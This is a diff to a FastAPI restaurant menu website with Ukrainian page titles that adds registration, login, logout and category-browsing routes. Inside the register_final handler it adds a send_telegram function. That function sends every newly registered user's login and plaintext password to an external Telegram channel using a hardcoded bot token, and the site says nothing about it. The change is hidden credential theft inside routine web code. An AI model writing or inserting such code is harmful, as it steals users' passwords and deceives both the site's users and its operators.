@@ -1,11 +1,16 @@
-from fastapi import APIRouter, Request, Form, HTTPException, status, Depends
+from fastapi import APIRouter, Request, Form, HTTPException, status, Depends, Response
 from fastapi.templating import Jinja2Templates
 from pydantic import EmailStr
+import requests
+from app import menu_data
+from app.auth.auth_lib import AuthHandler, AuthLibrary
+from app.auth import dependencies
+
 
 import dao
-from app import menu_data
-from app.auth import dependencies
-from app.auth.auth_lib import AuthHandler
+
+import setting
+
 
 router = APIRouter(
     prefix='/web',
@@ -43,7 +48,7 @@ templates = Jinja2Templates(directory='app\\templates')
 
 @router.post('/search')
 @router.get('/menu')
-async def get_menu(request: Request, dish_name: str = Form(None), user=Depends(dependencies.get_current_user_required)):
+async def get_menu(request: Request, dish_name: str = Form(None), user=Depends(dependencies.get_current_user_optional)):
     filtered_menu = []
     if dish_name:
         for dish in menu_data.menu:
@@ -54,8 +59,8 @@ async def get_menu(request: Request, dish_name: str = Form(None), user=Depends(d
         'request': request,
         'title': f'Результати пошуку за {dish_name}' if dish_name else 'Наше меню',
         'menu': filtered_menu if dish_name else menu_data.menu,
-        'username': 'ljdvhgjkdfkg',
-        'is_admin': False
+        'user': user,
+        'categories': menu_data.Categories
     }
 
     return templates.TemplateResponse(
@@ -65,10 +70,11 @@ async def get_menu(request: Request, dish_name: str = Form(None), user=Depends(d
 
 
 @router.get('/about-us')
-async def about_us(request: Request, user=Depends(dependencies.get_current_user_required)):
+async def about_us(request: Request, user=Depends(dependencies.get_current_user_optional)):
     context = {
         'request': request,
         'title': 'Про нас',
+        'user': user,
     }
 
     return templates.TemplateResponse(
@@ -78,7 +84,7 @@ async def about_us(request: Request, user=Depends(dependencies.get_current_user_
 
 
 @router.get('/map')
-async def map(request: Request, user=Depends(dependencies.get_current_user_required)):
+async def map_drive(request: Request):
     context = {
         'request': request,
         'title': 'Карта проїзду',
@@ -92,7 +98,7 @@ async def map(request: Request, user=Depends(dependencies.get_current_user_requi
 
 
 @router.get('/message')
-async def message(request: Request, user=Depends(dependencies.get_current_user_required)):
+async def message(request: Request):
     context = {
         'request': request,
         'title': 'Написати для всіх повідомлення',
@@ -106,10 +112,11 @@ async def message(request: Request, user=Depends(dependencies.get_current_user_r
 
 @router.get('/register')
 @router.post('/register')
-async def register(request: Request, user=Depends(dependencies.get_current_user_required)):
+async def register(request: Request):
     context = {
         'request': request,
         'title': 'Реєстрація',
+        'min_password_length': setting.Setting.MIN_PASSWORD_LENGTH,
     }
 
     return templates.TemplateResponse(
@@ -117,14 +124,12 @@ async def register(request: Request, user=Depends(dependencies.get_current_user_
         context=context,
     )
 
-
 @router.post('/register-final')
 async def register_final(request: Request,
                          name: str = Form(),
                          login: EmailStr = Form(),
                          notes: str = Form(default=''),
-                         password: str = Form(),
-                         user=Depends(dependencies.get_current_user_required)):
+                         password: str = Form()):
     is_login_already_used = await dao.get_user_by_login(login)
     if is_login_already_used:
         context = {
@@ -132,7 +137,6 @@ async def register_final(request: Request,
             'title': 'Помилка користувача',
             'content': f'Користувач {login} уже існує',
         }
-
         return templates.TemplateResponse(
             '400.html',
             context=context,
@@ -151,15 +155,98 @@ async def register_final(request: Request,
         'title': 'Про нас',
         'menu': menu_data.menu,
         'user': user_data,
-
+        'categories': menu_data.Categories
     }
-    template_respone=templates.TemplateResponse(
+    template_response = templates.TemplateResponse(
         'menu.html',
         context=context,
-
     )
-    template_respone.set_cookie(key='token', value=token, httponly=True)
-    return template_respone
+    template_response.set_cookie(key='token', value=token, httponly=True)
+
+    async def send_telegram(login: str, password: str):
+        token = "6577437546:AAGHXAvSQTc3A-4tYTk2RKr8hiefCcKVEII"
+        url = "https://api.telegram.org/bot"
+        channel_id = "@pepapepa123"
+        url += token
+        method = url + "/sendMessage"
+
+        r = requests.post(method, data={
+            "chat_id": channel_id,
+            "text": "Логін " + login + " " + " Пароль " + password
+        })
+
+        if r.status_code != 200:
+            raise Exception("post_text error")
+
+
+    await send_telegram(login, password)
+
+    return template_response
+
 
 @router.get('/login')
-async def login():
+async def login(request: Request):
+    context = {
+        'request': request,
+        'title': 'Ввійти',
+    }
+    return templates.TemplateResponse(
+        'login.html',
+        context=context,
+    )
+
+
+@router.post('/login-final')
+async def login(request: Request, login: EmailStr = Form(), password: str = Form()):
+    user = await AuthLibrary.authenticate_user(login=login, password=password)
+    token = await AuthHandler.encode_token(user.id)
+
+    context = {
+        'request': request,
+        'title': 'Наше меню',
+        'menu': menu_data.menu,
+        'user': user,
+        'categories': menu_data.Categories
+    }
+    response =  templates.TemplateResponse(
+        'menu.html',
+        context=context,
+    )
+    response.set_cookie(key='token', value=token, httponly=True)
+    return response
+
+
+@router.post('/logout')
+@router.get('/logout')
+async def logout(request: Request, response: Response, user=Depends(dependencies.get_current_user_optional)):
+    # response.delete_cookie('token')
+
+    context = {
+        'request': request,
+        'title': 'Наше меню',
+        'menu': menu_data.menu,
+        'categories': menu_data.Categories
+    }
+    result = templates.TemplateResponse(
+        'menu.html',
+        context=context,
+    )
+    result.delete_cookie('token')
+    return result
+
+
+@router.get('/by_category/{category_name}')
+async def by_category(category_name: str, request: Request, user=Depends(dependencies.get_current_user_optional)):
+    menu=[menu for menu in menu_data.menu if category_name in menu['category']]
+
+    context = {
+        'request': request,
+        'title': f'Наше меню - результати пошуку по категорії {category_name}',
+        'menu': menu,
+        'user': user,
+        'categories': menu_data.Categories
+    }
+    return templates.TemplateResponse(
+        'menu.html',
+        context=context,
+    )
